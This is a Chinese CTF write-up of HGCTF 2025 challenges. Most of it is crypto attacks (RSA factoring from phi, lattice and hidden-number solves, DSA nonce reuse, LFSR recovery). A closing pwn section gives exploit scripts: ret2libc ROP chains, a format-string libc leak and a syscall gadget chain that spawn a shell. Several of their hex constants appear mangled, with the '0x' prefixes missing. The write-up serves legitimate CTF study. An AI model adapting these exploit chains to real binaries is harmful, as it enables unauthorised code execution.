---
title: Hgctf2025
published: 2025-03-09
pinned: false
description: Hgctf2025，crypto，wp
tags: ['crypto']
category: CTF-crypto
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-09
pubDate: 2025-03-09
---


## 前言

质量挺高的一场新生赛，老登大乱斗（），这里只写一部分wp

## crypto题目

### baby_factor

task

```
from Crypto.Util.number import *
def create():
    pl  = []
    for i in range(3):
        pl.append(getPrime(1024))
    return sorted(pl)
pl = create()
m=b'NSSCTF{xxx}'
p,q,r = pl[0],pl[1],pl[2]
e = 65537
n = p*q*r
phi = (p-1)*(q-1)*(r-1)
c=pow(bytes_to_long(m),e,n)
print(f'n={n}')
print(f'phi={phi}')
print(f'c={c}')

```
好像是出题人数据问题
exp

```
n=
phi=
c=

e=65537

from Crypto.Util.number import *

m=pow(c,inverse(e,phi),n)
flag=long_to_bytes(m)
print(flag)
```

### baby_factor_revenge

task

```
from Crypto.Util.number import *
def create():
    pl  = []
    for i in range(3):
        pl.append(getPrime(1024))
    return sorted(pl)
pl = create()
m=b'NSSCTF{xxxxxx}'
p,q,r = pl[0],pl[1],pl[2]
n = p*q*r
phi = (p-1)*(q-1)*(r-1)
e=65537
phi_2=(p-1)*(q-1)
n2=p*q
c=pow(bytes_to_long(m),e,n2)
print(f'n={n}')
print(f'phi={phi}')
print(f'c={c}')
```

经典的已知phi&n分解

exp

```
from math import gcd
from math import isqrt
from random import randrange
from gmpy2 import is_prime


def factorize(N, phi):
    """
    Recovers the prime factors from a modulus if Euler's totient is known.
    This method only works for a modulus consisting of 2 primes!
    :param N: the modulus
    :param phi: Euler's totient, the order of the multiplicative group modulo N
    :return: a tuple containing the prime factors, or None if the factors were not found
    """
    s = N + 1 - phi
    d = s ** 2 - 4 * N
    p = int(s - isqrt(d)) // 2
    q = int(s + isqrt(d)) // 2
    return p, q


def factorize_multi_prime(N, phi):
    """
    Recovers the prime factors from a modulus if Euler's totient is known.
    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.
    More information: Hinek M. J., Low M. K., Teske E., "On Some Attacks on Multi-prime RSA" (Section 3)
    :param N: the modulus
    :param phi: Euler's totient, the order of the multiplicative group modulo N
    :return: a tuple containing the prime factors
    """
    prime_factors = set()
    factors = [N]
    while len(factors) > 0:
        # Element to factorize.
        N = factors[0]

        w = randrange(2, N - 1)
        i = 1
        while phi % (2 ** i) == 0:
            sqrt_1 = pow(w, phi // (2 ** i), N)
            if sqrt_1 > 1 and sqrt_1 != N - 1:
                # We can remove the element to factorize now, because we have a factorization.
                factors = factors[1:]

                p = gcd(N, sqrt_1 + 1)
                q = N // p

                if is_prime(p):
                    prime_factors.add(p)
                elif p > 1:
                    factors.append(p)

                if is_prime(q):
                    prime_factors.add(q)
                elif q > 1:
                    factors.append(q)

                # Continue in the outer loop
                break

            i += 1

    return tuple(prime_factors)
    
n=
phi=
c=

prime_list = sorted(factorize_multi_prime(n,phi))
p,q,r = prime_list[0],prime_list[1],prime_list[2]

print(p,q,r)

p=
q=
r=

from Crypto.Util.number import *
e=65537

phi1=(p-1)
n1=p
d=inverse(e,phi1)
ck=pow(c,d,n1)
print(long_to_bytes(ck))    
```

### baby_lattice

task

```
from Crypto.Util.number import *
from Crypto.Cipher import AES
import os
from Crypto.Util.Padding import pad
from secret import flag
miku = 30
p = getPrime(512)
key = getPrime(512)
while key> p:
    key= getPrime(512)
ts = []
gs = []
zs = []
for i in range(miku):
    t = getPrime(512)
    z = getPrime(400)
    g= (t * key + z) % p
    ts.append(t)
    gs.append(g)
    zs.append(z)
print(f'p = {p}')
print(f'ts = {ts}')
print(f'gs = {gs}')
iv= os.urandom(16)
cipher = AES.new(str(key).encode()[:16], AES.MODE_CBC,iv)
ciphertext=cipher.encrypt(pad(flag.encode(),16))
print(f'iv={iv}')
print(f'ciphertext={ciphertext}')
```

就是最简单的NHP问题

exp

```
p = 
ts = 
gs = 
iv=b'\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8'
ciphertext=b'\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&8%,M'
p = p
rs = ts
cs = gs
t = len(rs)
kbits = 400
K = 2 ** kbits

P = identity_matrix(t) * p
RC = matrix([[-1, 0], [0, 1]]) * matrix([rs, cs])
KP = matrix([[K / p, 0], [0, K]])
M = block_matrix([[P, 0], [RC, KP]], subdivide=False)
shortest_vector = M.LLL()
x = shortest_vector[1, -2] / K * p % p
print(x)


from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = 
aes_key = str(key).encode()[:16]

iv=b'\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8'
ciphertext=b'\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&8%,M'

cipher = AES.new(aes_key, AES.MODE_CBC, iv)
flag = unpad(cipher.decrypt(ciphertext), 16)

print(flag)  
```

### babysignin

task

```
from Crypto.Util.number import getPrime, bytes_to_long
p=getPrime(128)
q=getPrime(128)
n=p*q
phi=(p-1)*(q-1)
flag="NSSCTF{xxxxxx}"
print("p=",p)
print("q=",q)
m=bytes_to_long(flag.encode())
e=4
c=pow(m,e,n)
print("c=",c)
print("n=",n)
```

crt梭哈，或者是当作e&phi不互素去写

exp

```
p = 
q = 
c = 
n = p * q

c_p = c % p
c_q = c % q

from sympy.ntheory.residue_ntheory import nthroot_mod

roots_p = nthroot_mod(c_p, 4, p, all_roots=True)
roots_q = nthroot_mod(c_q, 4, q, all_roots=True)

from sympy.ntheory.modular import crt
from Crypto.Util.number import long_to_bytes

for root_p in roots_p:
    for root_q in roots_q:
        m, _ = crt([p, q], [root_p, root_q])
        flag = long_to_bytes(m)
        if b'NSSCTF{' in flag:
            print(flag)
            exit()
```

```
from Crypto.Util.number import *
p= 
q= 
c= 
n= 
e= 4
 
phi = (p-1)*(q-1)
gcd = GCD(e,phi)
 
res1 = Zmod(p)(c).nth_root(gcd, all=True)
res2 = Zmod(q)(c).nth_root(gcd, all=True)
 
for i in res1:
    for j in res2:
        m = crt([int(i),int(j)],[p,q])
        if m is not None:
            try:
                print(long_to_bytes(int(m)).decode())
            except Exception as e:
                continue
```

### ez_femat

task

```
from Crypto.Util.number import getPrime, bytes_to_long
from secret import f

flag = b'NSSCTF{test_flag}'
p = getPrime(512)
q = getPrime(512)
n = p*q

m = bytes_to_long(flag)
e = 65537
c = pow(m,e,n)

R.<x> = ZZ[]
f = R(str(f))

w = pow(2,f(p),n)


print(f'{n = }\n')
print(f'{e = }\n')
print(f'{c = }\n')
print(f'{f = }\n')
print(f'{w = }\n')
```

其实当时看到题目是费马的时候没有想那么多，我把`p-1`当作可以被这个多项式整除的式子，就直接算`x=1`的情况，结果真出来了（）

exp

```
from sage.all import *

var('x')

f_str = ""
f = sage_eval(f_str, locals={'x': x})

f1 = f.subs(x=1)
print(f"f(1) = {f1}")

from Crypto.Util.number import inverse, GCD, long_to_bytes

n = 
e = 65537
c = 
w = 
a = -57
b = inverse(pow(2, -a, n), n)
d = GCD(w - b, n)

if 1 < d < n:
    p = d
    q = n // p
else:
    p = n // d
    q = d

phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
```

### EZ_Fermat_bag_PRO

task

```
from Crypto.Util.number import getPrime, bytes_to_long
from random import *
from secret import f, flag

assert len(flag) == 88
assert flag.startswith(b'NSSCTF{')
assert flag.endswith(b'}')

p = getPrime(512)
q = getPrime(512)
n = p*q

P.<x,y> = ZZ[]
f = P(str(f))

w = pow(2,f(p,q),n)
assert all(chr(i) in ''.join(list(set(str(p)))) for i in flag[7:-1:])
c = bytes_to_long(flag) % p

print(f'{n = }\n')
print(f'{f = }\n')
print(f'{w = }\n')
print(f'{c = }\n')
```

与上一个不同的是这个是xy双元多项式，第一开始的想法就是把他变成单元的，然后发现怎么写怎么不对，完啦
后面发现正确的思维是把这个先对f换元，把y消掉，然后构造费马定理，估计上一题也是瞎猫碰死耗子，求出p后发现很难爆破出来，其实是类似鸡块神的nssdlc关卡，不知道出题人的灵感是不是从这来的

exp
```
from Crypto.Util.number import *
n = 
w = 
c = 

P.<x,y> = PolynomialRing(ZZ)
f = 
g = f(x,n/x)(x+1,0)
print(g)
 
p = GCD(pow(2,g(0,0),n)-w,n)

from Crypto.Util.number import *

p=12887845651556262230127533819087214645114299622757184262163859030601366568025020416006528177186367994745018858915213064803349065489849643880676026721892753
c = 10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942


Ge = Matrix(ZZ,82,82)

temp = bytes_to_long(b"NSSCTF{") * 256^81 + bytes_to_long(b"}") 
for i in range(80):
    temp += 48*256^(80-i)


for i in range(80):
    Ge[i,i] = 1
    Ge[i,-1] = 256^(80-i)
    
Ge[-2,-2] = 3
Ge[-2,-1] = (temp - c)
Ge[-1,-1] = p

for line in Ge.BKZ():
    m = ""
    if line[-1] == 0 and abs(line[-2]) == 3:
        print(line)
        for i in line[:-2]:
            m += str(abs(i))
        flag = "NSSCTF{" + m + "}"
        print(flag)
```

(不知道为啥子会求出来两个，奇奇怪怪)

### MIMT_RSA

task

```
from Crypto.Util.number import *
from hashlib import md5
from secret import KEY， flag  


assert int(KEY).bit_length() == 36
assert not isPrime(KEY)

p = getPrime(1024)
q = getPrime(1024)
n = p * q
e = 0x10001

ck = pow(KEY, e, n)


assert flag == b'NSSCTF{' + md5(str(KEY).encode()).hexdigest().encode() + b'}'

print(f"{n = }")
print(f"{e = }")
print(f"{ck = }")
```

题目名字直接说了是mitm，就往上面靠呗，`KEY`是三十六位的，本来想着从18位开始爆，发现出不来，修改范围试试就行了，哈希表加多进程还是很快的，但是我代码写的依托

exp

```
import gmpy2
from gmpy2 import powmod, invert
import multiprocessing as mp
from hashlib import md5

n = 
e = 
ck = 

def precompute_a(start, end, queue):
    hash_table = {}
    for a in range(start, end):
        a_e = powmod(a, e, n)
        hash_table[a_e] = a
    queue.put(hash_table)

def search_b(start, end, hash_table, queue):
    result = None
    for b in range(start, end):
        b_e = powmod(b, e, n)
        try:
            inv_b_e = invert(b_e, n)
        except gmpy2.ZeroDivisionError:
            continue
        tmp = (ck * inv_b_e) % n
        if tmp in hash_table:
            a = hash_table[tmp]
            KEY = a * b
            if KEY.bit_length() == 36 and not gmpy2.is_prime(KEY):
                result = KEY
                break
    queue.put(result)

def main():
    a_start = 1
    a_end = 2**20  # 扩大范围至2^19，覆盖1到524287

    num_processes = 8
    chunk_size = (a_end - a_start + num_processes - 1) // num_processes  # 确保覆盖所有a值

    manager = mp.Manager()
    queue = manager.Queue()

    processes = []
    for i in range(num_processes):
        start = a_start + i * chunk_size
        end = min(start + chunk_size, a_end)
        p = mp.Process(target=precompute_a, args=(start, end, queue))
        processes.append(p)
        p.start()

    hash_table = {}
    for _ in range(num_processes):
        ht = queue.get()
        hash_table.update(ht)

    for p in processes:
        p.join()

    print(f"Hash table size: {len(hash_table)}")

    b_start = 1
    b_end = 2**20

    # 修正b的分割方式，确保覆盖所有值
    b_chunk_size = (b_end - b_start + num_processes - 1) // num_processes

    result_queue = manager.Queue()
    processes = []
    for i in range(num_processes):
        start = b_start + i * b_chunk_size
        end = min(start + b_chunk_size, b_end)
        p = mp.Process(target=search_b, args=(start, end, hash_table, result_queue))
        processes.append(p)
        p.start()

    KEY = None
    for _ in range(num_processes):
        res = result_queue.get()
        if res is not None:
            KEY = res
            # 终止所有进程
            for p in processes:
                if p.is_alive():
                    p.terminate()
            break

    for p in processes:
        p.join()

    if KEY is not None:
        print(f"Found KEY: {KEY}")
        md5_hash = md5(str(KEY).encode()).hexdigest()
        flag = f"NSSCTF{{{md5_hash}}}"
        print(flag)
    else:
        print("KEY not found. Consider further expanding the search range or optimizing the factorization strategy.")

if __name__ == "__main__":
    main()
```

### RSA_and_DSA

task

```
from random import getrandbits, randint
from secrets import randbelow
from Crypto.Util.number import*
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import hashlib
import random
import gmpy2
ink=getPrime(20)
p1= getPrime(512)
q1= getPrime(512)
N = p1* q1
phi = (p1-1) * (q1-1)
while True:
    d1= getRandomNBitInteger(200)
    if GCD(d1, phi) == 1:
        e = inverse(d1, phi)
        break
c_ink = pow(ink, e, N)
print(f'c_ink=',c_ink)
print(f'e=',e)
print(f'N=',N)
link=261641
k= getPrime(64)
q = getPrime(160)
def sign(msg, pub, pri, k):
    (p,q,g,y) = pub
    x = pri
    r = int(pow(g, k, p) % q)
    h = int(hashlib.sha256(msg).digest().hex(),16)
    s = int((h + x * r) * gmpy2.invert(k, q) % q)
    return (r, s)

while True:
    temp = q * getrandbits(864)
    if isPrime(temp + 1):
        p = temp + 1
        break
assert p % q == 1
h = randint(1, p - 1)
g = pow(h, (p - 1) // q, p)
y = pow(g, k, p)
pub = (p,q,g,y)
pri = random.randint(1, q-1)

print(f"(r1,s1)=",sign(b'GHCTF-2025', pub, pri, k))
print(f"(r2,s2)=",sign(b'GHCTF-2025', pub, pri, k+ink))
print(f"{g= }")
print(f"{q= }")
print(f"{p= }")
print(f"{y= }")
key = hashlib.sha1(str(pri).encode()).digest()[:16]
cipher = AES.new(key, AES.MODE_ECB)
flag="NSSCTF{xxxxxxxx}"
ciphertext = cipher.encrypt(pad(flag.encode(), 16))
print(f"{ciphertext = }")
```

前半段明显的维纳攻击，后半段dsa，前面板子就不写了，只放后面的

exp

```
import hashlib
import gmpy2
from Crypto.Cipher import AES
(r1,s1)= (..., ...)
(r2,s2)= (..., ...)
g= ...
q= ...
p= ...
y= ...
ciphertext = ...
msg = b'GHCTF-2025'
h = int(hashlib.sha256(msg).digest().hex(),16)
a = 1
b =...
k = ((h*(r2 - r1) + b*r1*s2)*gmpy2.invert((r2*s1-a*r1*s2),q)) % q
x1 = (k*s1 - h)*gmpy2.invert(r1,q) % q
print(x1)
key = hashlib.sha1(str(x1).encode()).digest()[:16]
cipher = AES.new(key, AES.MODE_ECB)
ptext=cipher.decrypt(ciphertext)
print(ptext)
```

### river

task

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import md5
from secret import flag, seed, mask


class 踩踩背:
    def __init__(self, n, seed, mask, lfsr=None):
        self.state = [int(b) for b in f"{seed:0{n}b}"]
        self.mask_bits = [int(b) for b in f"{mask:0{n}b}"]
        self.n = n
        self.lfsr = lfsr

    def update(self):
        s = sum([self.state[i] * self.mask_bits[i] for i in range(self.n)]) & 1
        self.state = self.state[1:] + [s]

    def __call__(self):
        if self.lfsr:
            if self.lfsr():
                self.update()
            return self.state[-1]
        else:
            self.update()
            return self.state[-1]


class 奶龙(踩踩背):
    def __init__(self, n, seed, mask):
        super().__init__(n, seed, mask, lfsr=None)


n = 64
assert seed.bit_length == mask.bit_length == n
lfsr1 = 奶龙(n, seed, mask)
lfsr2 = 踩踩背(n, seed, mask, lfsr1)
print(f"mask = {mask}")
print(f"output = {sum(lfsr2() << (n - 1 - i) for i in range(n))}")
print(f"enc = {AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, 16))}")
```

一个抽象的lfsr，`lfsr1`&`lfsr2`生成时用的种子什么的都一样，只不过`lfsr2`需要依赖前者去判断是否输出，我们可以模拟这个状态去生成流

- 当`lsfr1`的输出是1的时候，就更新`lsfr2`的状态
- 当`lsfr1`的输出是0的时候，就直接拿`lsfr2`的状态的最后一位

我们就可以根据这个去猜测`lfsr2`的第k位可能来自`lfsr1`的第i位，我们就可以猜测到`lfsr2`的下一位的多种情况

{{< raw >}}
$$ flsr1 \quad 1 \ 1 \ 0 \ 0 \\flsr2 \quad 1 \ 1 \ 1 \  1$$
   这个时候$lfsr2$的第三位还是$lfsr1$的第二位，也就是$k+1=i$

$$ flsr1 \quad 1 \ 1 \\ flsr2 \quad 1 \ 1 $$
   这种情况就是$k+1=i=i+1$，状态是肯定更新的

$$ flsr1 \quad 1 \ 1 \ 0 \ 1 \\flsr2 \quad 1 \ 1 \ 1 \  0$$
   这种情况就是$k+1=i+1$ but $k+1!=i$，其实也会更新
{{< /raw >}}

所以我们仅需剪枝去搜索出`lfsr1` 的64位即可恢复`seed`

exp
```
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import md5
from tqdm import tqdm
import sys

mask = 9494051593829874780
output = 13799267741689921474
lsfr2 = bin(output)[2:].zfill(64)
enc = 

t_L = block_matrix(Zmod(2), [[Matrix(ZZ, 63, 1).augment(identity_matrix(63))], 
                            [Matrix(ZZ, 1, 64, [int(i) for i in bin(mask)[2::].zfill(64)])]])
L = []
for i in range(1, 64 + 1):
    L.append((t_L ^ i)[-1])
L = Matrix(Zmod(2), 64, 64, L)

def find(lsfr1, k):
    #初始化
    length = len(lsfr1)

    #剪枝
    if length < 64 and lsfr1[k] != lsfr2[length] and lsfr1[k + 1] != lsfr2[length]:
        return

    #搜索和更深层次递归
    if length == 64:
        B = []
        for i in range(1, length + 1):
            B.append(int(lsfr1[i - 1]))
        
        seed = L.solve_right(Matrix(Zmod(2), 64, 1, B))
        seed = int(''.join([str(i[0]) for i in seed]), 2)
        flag = AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).decrypt(enc)
        if flag.isascii():
            print(flag)
            sys.exit()

    elif length < 64:
        if lsfr1[k] == lsfr2[length]:
            find(lsfr1 + '0', k)
    
            if lsfr1[k + 1] == lsfr2[length]:
                find(lsfr1 + '1', k + 1)
    
        if lsfr1[k] != lsfr2[length] and lsfr1[k + 1] == lsfr2[length]:
            find(lsfr1 + '1', k + 1)
find('01', 0)

```

### sin
task
```

from Crypto.Util.number import bytes_to_long; print((2 * sin((m := bytes_to_long(b'NSSCTF{test_flag}'))) - 2 * sin(m) * cos(2 * m)).n(1024))

'''
m的值即为flag
0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412
'''

```

第一眼看上去的思路是化简这个式子，然后`arcsin`，突然想起来这玩意相当于取模了,

$$
m-2k\pi =c
$$
but这样写会有误差，毕竟你开方什么的乱七八糟的操作，会产生误差很合理吧，即
$$
m-2k\pi =c+a
$$
哎？这就很格了
{{< raw >}}
$$(m,-1,-k)\begin{bmatrix}
1 & 0 & K \\
0 & T & c \times K \\
0 & 0 & 2 \times \pi \times K
\end{bmatrix}=(m,1,ak)$$
{{< /raw >}}

exp
记得配平
```
from Crypto.Util.number import *
c = 
R.<x> = PolynomialRing(QQ)
f = x^3-(c/4)
res = f.roots()
c = abs(arcsin(res[0][0]))
 
K = 2^900
T = 2^300
ge = [[1,0,K],[0,T,c*K],[0,0,2*pi.n(1024)*K]]
Ge = Matrix(QQ,ge)
L = Ge.LLL()
print(L)
assert abs(L[0][1]) == T
m = long_to_bytes(int(abs(L[0][0])))
if b"NSSCTF{" in m:
    print(m)

```

## pwn题目

### hello world
有pie无canary并且有溢出， partial write返回地址秒了

exp
```
from pwnfunc import *
io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""
payload = b"a" * 028 + p8(0C5)
s(payload)
ia()
```

### ret2libc1
先刷钱，刷完钱可以接触到溢出函数，溢出两次泄露+利用

exp

```
from pwnfunc import *
io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""
sl(b"3")
ru(b"How much do you want to spend buying the hell_money?\n")
sl(str(1000))
r()
sl(b"7")
r()
sl(b"10000")
ru(b"6.check youer money\n")
sl(b"5")
ru(b"You can name it!!!\n")
prdi = 00000000000400D73
payload = (
    b"a" * 048 + p(prdi) + p(elf.got["puts"]) + p(elf.plt["puts"]) + 
p(elf.sym["main"])
)
s(payload)
base = u(r(6).ljust(8, b"\0")) - 0000000000006F6A0
success(hex(base))
system = base + libc.sym["system"]
binsh = base + 0000000000018CE57
payload = b"a" * (048) + p(00000000000400579) + p(prdi) + p(binsh) + p(system)
sl(b"5")
s(payload)
ia()
```

### ret2libc2
发现程序有fmt漏洞，溢出返回到printf处泄露栈上libc，然后往bss上写rop链最后跳过去

exp
```
from pwnfunc import *
io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""
ru(b"hello world!\n")
ret = 0000000000040101A
payload = (
    b"|%3$p.".ljust(030, b"a") + p(00000000000404060 + 0900) + 
p(00000000000401227)
)
ps()
s(payload)
ru(b"|")
base = int(r(len(b"07f8b4ff547e2")), 16) - 01147E2
success(hex(base))
ru(b"show your magic\n")
# s(p(0EBC85 + base))
payload = (
    b"a" * (030)
    + p(00000000000404060 - 0100 - 0238)
    + p(ret)
    + p(base + 0000000000002A3E5)
    + p(base + 000000000001D8678)
    + p(base + 0000000000050D70)
)
s(payload)
ia()

```

### 真会布置栈吗
很短小的程序，程序给了一些gadget和栈地址，通过0x401017 处的pop群可以控制两个直接需要的寄存
器（r13和r15也要用，但是是间接的），pops完后跳到0x401021 清零rdx，最后跳到0x40100C 将r13
的值赋值给rax，然后syscall
其实一开始想到的是打srop，但是本地srop死活跑不通，无奈只能换思路

exp
```
from pwnfunc import *
io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""
ru(b"\x29\x0a")
stack = u(r(6).ljust(8, b"\0"))
success(hex(stack))
ret = 00000000000401013
ps()
payload = (
    p(ret)
    + p(00000000000401019) # pop 3 trash
    + p(0)
    + b"/bin/sh\0"
    + p(00000000000401017) # pops
    + p(0)  # rsi
    + p(stack)  # rdi
    + p(0)  # rbx
    + p(03B)  # r13
    + p(ret)  # r15
    + p(0000000000401021)  # xor rdx, rdx
    + p(000000000040100C) # xchg rax, 03bh
    + p(00000000000401077) # syscall
)
s(payload)
ia()
```